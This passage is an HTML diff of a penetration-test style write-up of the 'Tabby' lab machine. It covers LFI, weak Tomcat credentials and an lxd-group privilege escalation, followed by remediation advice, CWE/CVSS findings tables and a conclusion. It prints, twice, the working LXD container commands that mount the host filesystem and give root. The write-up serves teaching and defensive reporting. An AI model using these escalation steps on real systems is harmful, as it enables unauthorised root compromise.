+                            <img src="../images/Posts/Tabby/21.png" alt="">
+                        </div>
+                        <p>On our machine we run the following commands as root:</p>
+                        <div class="console-code">
+                            <pre>
+$ git clone https://github.com/saghul/lxd-alpine-builder
+$ cd lxd-alpine-builder
+$ sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
+$ sudo ./build-alpine -a i686 
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/22.png" alt="">
+                        </div>
+                        <p>The two "<strong>*.tar.gz</strong>" files are the ones we have to move to the target machine, more precisely to the default <strong>$HOME</strong> directory of the <strong>ash</strong> user.</p>
+                        <p>Once the files are on the <strong>destination machine</strong>, we execute the following commands:</p>
+                        <div class="console-code">
+                            <pre>
+$ lxc image import ./alpine*.tar.gz --alias myimage
+$ lxd init
+$ lxc init myimage mycontainer -c security.privileged=true
+$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+$ lxc start mycontainer
+$ lxc exec mycontainer /bin/sh
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/23.png" alt="">
+                            <img src="../images/Posts/Tabby/24.png" alt="">
+                        </div>
+                        <p>And finally we managed to mount the container and gain root access to the system.</p>
+                    </section>
+
+                    <section id="Remmediation-Summary">
+                        <h1>7. Remmediation Summary</h1>
+                        <p>As a result of this assessment, there are several opportunities for <strong>Tabby</strong> to strengthen the security of its internal network. Remediation efforts are then prioritized, starting with those likely to require the least amount of time and effort to complete. <strong>Tabby</strong> must ensure that all remediation steps and mitigation controls are carefully planned and tested to prevent service interruptions or data loss.</p>
+                        <section id="Short-Term">
+                            <h2>7.1 Short Term</h2>
+                            <ul>
+                                <li><strong>Tomcat Configuration<span style="color: rgb(78, 211, 78);"> [Finding 3]</span></strong></li>
+                                <ul>
+                                    <li>Change the default credentials and ensure that the tomcat-users.xml file is not accessible from the web.</li>
+                                    <li><strong>Solution</strong>: Secure the access settings and set strong and unique passwords for Tomcat users.</li>
+                                </ul>
+                                <li><strong>Block access to sensitive files (LFI) <span style="color: rgb(78, 211, 78);">[Finding 2]</span></strong></li>
+                                <ul>
+                                    <li>Review web server configuration to prevent unauthorized access to sensitive files.</li>
+                                    <li><strong>Solution</strong>: Implement strict validation of URL input parameters to prevent access to directories and files that should not be visible.</li>
+                                </ul>
+                                <li><strong>Password Strengthening <span style="color: rgb(78, 211, 78);">[Finding 4]</span></strong></li>
+                                <ul>
+                                    <li>Change all weak passwords, such as those used on the archive, to more complex passwords.</li>
+                                    <li><strong>Solution</strong>: Use random and strong passwords and implement proper encryption on all sensitive files.</li>
+                                </ul>
+                            </ul>
+                        </section>
+                        <section id="Medium-Term">
+                            <h2>7.2 Medium Term</h2>
+                            <ul>
+                                <li><strong>Review and adjust user permissions<span style="color: rgb(78, 211, 78);"> [Finding 1]</span></strong></li>
+                                <ul>
+                                    <li>Perform an audit of user groups and adjust permissions based on the principle of <strong>least privilege</strong>.</li>
+                                    <li><strong>Solution</strong>: Limit access to the `lxd` group to essential users only and ensure that no other groups are granting excessive privileges.</li>
+                                </ul>
+                                <li><strong>Implement multi-factor authentication (MFA)<span style="color: rgb(78, 211, 78);"> [Finding 3]</span></strong></li>
+                                <ul>
+                                    <li>Configure MFA on all critical applications such as Tomcat and other administrative services to increase security.</li>
+                                    <li>Solution: This measure helps prevent unauthorized access, even if credentials are compromised.</li>
+                                </ul>
+                                <li><strong>Monitoring and auditing logs<span style="color: rgb(78, 211, 78);"> [Finding 2]</span></strong></li>
+                                <ul>
+                                    <li>Implement a monitoring system that records and alerts on unauthorized access or suspicious activities.</li>
+                                    <li><strong>Solution</strong>: Review logs regularly to detect possible attempts to exploit vulnerabilities such as <strong>LFI</strong> or access to sensitive files.</li>
+                                </ul>
+                            </ul>                            
+                        </section>
+                        <section id="Long-Term">
+                            <h2>7.3 Long Term</h2>
+                            <ul>
+                                <li><strong>Security architecture redesign</strong></li>
+                                <ul>
+                                    <li>Plan and perform an infrastructure restructure to improve role separation and access control.</li>
+                                    <li><strong>Solution</strong>: Ensure that critical web services, databases, and applications are properly isolated, with minimal exposure to the public network.</li>
+                                </ul>
+                                <li><strong>Implementation of continuous security testing (CI/CD)</strong></li>
+                                <ul>
+                                    <li>Integrate automated security testing into the software development lifecycle, ensuring that vulnerabilities are detected from the earliest stages.</li>
+                                    <li><strong>Solution</strong>: Use static and dynamic code analysis tools to detect vulnerabilities before they reach the production environment.</li>
+                                </ul>
+                                <li><strong>Periodic review of security policies</strong></li>
+                                <ul>
+                                    <li>Establish a security policy that includes regular reviews of permissions, service configurations, and passwords.</li>
+                                    <li><strong>Solution</strong>: Ensure security policies are kept up to date with best practices and are periodically reviewed to adapt to new threats.</li>
+                                </ul>
+                            </ul>
+                        </section>
+                    </section>
+                    <section id="Technical-Findings-Details">
+                        <h1>8. Technical Findings Details</h1>
+                        <h3>Excessive user permissions - <span style="color: red">High</span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-red">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/264.html" target="_blank">CWE-264</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-red">CVSS</td>
+                                    <td id="column-2-2">8</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Description</td>
+                                    <td id="column-2-1">Excessive permissions for standard users (lxd group).</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Security Impact</td>
+                                    <td id="column-2-2">Users with excessive permissions can execute unauthorized commands, elevate privileges, or manipulate critical system settings.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Remediation</td>
+                                    <td id="column-2-1">Review and audit user permissions to ensure there are no unnecessary privileges. Apply the principle of <strong>least privileges</strong> and configure user roles appropriately in the system and applications.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <p>We list the privileges we have and the user <strong>ash</strong> belongs to the <strong>lxd</strong> group. With these permissions there is a way to elevate our privileges by mounting a container that contains the entire system. We will use Hacktricks <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" target="_blank">method 2</a>.</p>
+                        <p>On our machine we run the following commands as root:</p>
+                        <div class="console-code">
+                            <pre>
+$ git clone https://github.com/saghul/lxd-alpine-builder
+$ cd lxd-alpine-builder
+$ sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
+$ sudo ./build-alpine -a i686 
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/22.png" alt="">
+                        </div>
+                        <p>The two "<strong>*.tar.gz</strong>" files are the ones we have to move to the target machine, more precisely to the default <strong>$HOME</strong> directory of the <strong>ash</strong> user.</p>
+                        <p>Once the files are on the <strong>destination machine</strong>, we execute the following commands:</p>
+                        <div class="console-code">
+                            <pre>
+$ lxc image import ./alpine*.tar.gz --alias myimage
+$ lxd init
+$ lxc init myimage mycontainer -c security.privileged=true
+$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+$ lxc start mycontainer
+$ lxc exec mycontainer /bin/sh
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/23.png" alt="">
+                            <img src="../images/Posts/Tabby/24.png" alt="">
+                        </div>
+                        
+                        <h3>Local File Inclusion (LFI) - <span style="color:red"> High</span> </h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-red">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/98.html" target="_blank">CWE-98</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-red">CVSS</td>
+                                    <td id="column-2-2">7.5</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Description</td>
+                                    <td id="column-2-1">Local File Inclusion (LFI): The URL allows the inclusion of arbitrary files from the system.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Security Impact</td>
+                                    <td id="column-2-2">Allows unauthorized reading of sensitive files such as /etc/passwd or tomcat-users.xml, which may reveal users and passwords.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Remediation</td>
+                                    <td id="column-2-1">Filter and validate URL input parameters appropriately. Use <strong>sanitization</strong> functions to avoid relative paths. Review access permissions to sensitive files.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <p>Given the form of the URL, it appears to receive a filename as a parameter which is read and displayed on the page. We checked if it is vulnerable to <strong>LFI</strong> with basic payloads, we managed to exploit an <strong>LFI</strong> and noticed that there is a user named <strong>ash</strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/3.png" alt="">
+                        </div>
+
+                        <h3>Plaintext Storage of a Password - <span style="color:orange">Medium</span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-orange">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/256.html" target="_blank">CWE-256</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-orange">CVSS</td>
+                                    <td id="column-2-2">6.8</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Description</td>
+                                    <td id="column-2-1">Default username and weak passwords stored in plain text in Tomcat service.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Security Impact</td>
+                                    <td id="column-2-2">Allows unauthorized access to Tomcat management, making it easier to execute malicious commands or load malicious applications.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Remediation</td>
+                                    <td id="column-2-1">Change default credentials and use strong passwords. Enable multi-factor authentication (MFA) for critical access. Properly configure permissions for sensitive files.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/6.png" alt="">
+                        </div>
+
+                        <h3>Weak Password Requirements - <span style="color:orange">Medium</span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-orange">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/521.html" target="_blank">CWE-521</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-orange">CVSS</td>
+                                    <td id="column-2-2">5.9</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Description</td>
+                                    <td id="column-2-1">Using weak passwords for archive files.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Security Impact</td>
+                                    <td id="column-2-2">Access to confidential information through brute force attacks.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Remediation</td>
+                                    <td id="column-2-1">Use strong passwords and robust encryption techniques; avoid storing passwords in clear text.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/18.png" alt="">
+                        </div>
+                    </section>                   
+                   
+                    <section id="Conclusion">
+                        <h1>7. Conclusion</h1>
+                        <p>The analyzed system presents several critical vulnerabilities, such as the exposure of sensitive files through a Local File Inclusion (LFI), insecure configurations in Apache Tomcat, weak passwords, and excessive permissions on certain users. These vulnerabilities allowed the attacker to gain access to sensitive data and escalate privileges, leading to system compromise.</p>
+                        <p>To mitigate these risks, immediate solutions should be implemented, such as securing sensitive files, strengthening passwords, and adjusting service settings. In the medium term, it is essential to review user permissions, implement multi-factor authentication (MFA), and establish constant security monitoring. In the long term, it is recommended to improve the security architecture, integrate continuous security testing, and conduct periodic audits.</p>
+                        <p>A combination of these solutions will help strengthen system security, reduce the risk of exploitation, and ensure stronger protection against future attacks.</p>
+                    </section>
+                    
+                    <section id="Appendices">
+                        <h1> 8. Appendices</h1>              
+                    </section>
+                    <!--Final-->
+                </section>
+            </div>
+        </div>
+    </div>
+    
+    <!--Pet Cat-->
+    <div class="pet-container">
+        <img src="" alt="Walking Pet" id="pet" class="pet">
+    </div>
+    <!--Pet Cat-->
+    <script src="script.js"></script>
+</body>
+</html>
